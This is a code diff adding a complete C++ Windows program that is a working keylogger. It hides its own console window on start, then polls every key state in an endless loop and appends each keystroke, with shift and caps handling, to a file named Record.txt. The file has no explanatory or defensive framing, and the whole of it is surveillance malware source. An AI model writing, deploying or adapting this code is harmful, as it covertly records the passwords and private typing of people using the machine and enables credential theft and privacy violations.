@@ -1,0 +1,193 @@
+#include <iostream>
+#include <windows.h>
+#include <winuser.h>
+#include <fstream>
+
+using namespace std;
+void hide();
+void log();
+int main(int argc, char const *argv[])
+{
+    hide();
+    log();
+    return 0;
+}
+void hide()
+{
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0);
+}
+void log()
+{
+    int key;
+    for (;;)
+    {
+        for (key = 8; key <= 222; key++)
+        {
+            if (GetAsyncKeyState(key) == -32767)
+            {
+                ofstream hout("Record.txt", ios::app);
+                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
+                bool caps = (GetAsyncKeyState(VK_CAPITAL) & 0x0001);
+                if ((key > 64) && (key < 91))
+                {
+                    if (shift ^ caps)
+                    {
+                        hout << (char)key;
+                        break;
+                    }
+                    else
+                    {
+                        key += 32;
+                        hout << (char)key;
+                        break;
+                    }
+                }
+                else if ((key >= 48) && (key <= 57))
+                {
+                    switch (key)
+                    {
+                    case 49:
+                        if (shift)
+                        {
+                            hout << "!";
+                        }
+                        else
+                            hout << "1";
+                        break;
+                    case 48:
+                        if (shift)
+                        {
+                            hout << ")";
+                        }
+                        else
+                            hout << "0";
+                        break;
+                    case 50:
+                        if (shift)
+                        {
+                            hout << "@";
+                        }
+                        else
+                            hout << "2";
+                        break;
+                    case 51:
+                        if (shift)
+                        {
+                            hout << "#";
+                        }
+                        else
+                            hout << "3";
+                        break;
+                    case 52:
+                        if (shift)
+                        {
+                            hout << "$";
+                        }
+                        else
+                            hout << "4";
+                        break;
+                    case 53:
+                        if (shift)
+                        {
+                            hout << "%";
+                        }
+                        else
+                            hout << "5";
+                        break;
+                    case 54:
+                        if (shift)
+                        {
+                            hout << "^";
+                        }
+                        else
+                            hout << "6";
+                        break;
+                    case 55:
+                        if (shift)
+                        {
+                            hout << "&";
+                        }
+                        else
+                            hout << "7";
+                        break;
+                    case 56:
+                        if (shift)
+                        {
+                            hout << "*";
+                        }
+                        else
+                            hout << "8";
+                        break;
+                    case 57:
+                        if (shift)
+                        {
+                            hout << "(";
+                        }
+                        else
+                            hout << "9";
+                        break;
+                    }
+                }
+                else
+                {
+                    switch (key)
+                    {
+                    case VK_SPACE:
+                        hout << " ";
+                        break;
+                    case VK_RETURN:
+                        hout << "\n";
+                        break;
+                    case VK_TAB:
+                        hout << "        ";
+                        break;
+                    case VK_BACK:
+                        hout << "<BackSpace>";
+                        break;
+                    case VK_ESCAPE:
+                        hout << "<Esc>";
+                        break;
+                    case VK_DELETE:
+                        hout << "<Delete";
+                        break;
+                    case VK_OEM_MINUS :
+                        hout << (shift ? "_" : "-");
+                        break;
+                    case VK_OEM_PLUS:
+                        hout << (shift ? "+" : "=");
+                        break;
+                    case VK_OEM_4:
+                        hout << (shift ? "{" : "[");
+                        break;
+                    case VK_OEM_6:
+                        hout << (shift ? "}" : "]");
+                        break;
+                    case VK_OEM_5:
+                        hout << (shift ? "|" : "\\");
+                        break;
+                    case VK_OEM_1:
+                        hout << (shift ? ":" : ";");
+                        break;
+                    case VK_OEM_7:
+                        hout << (shift ? "\"" : "'");
+                        break;
+                    case VK_OEM_COMMA:
+                        hout << (shift ? "<" : ",");
+                        break;
+                    case VK_OEM_PERIOD:
+                        hout << (shift ? ">" : ".");
+                        break;
+                    case VK_OEM_2:
+                        hout << (shift ? "?" : "/");
+                        break;
+                    }
+                }
+                hout.close();
+            }
+        }
+        Sleep(3);
+    }
+}
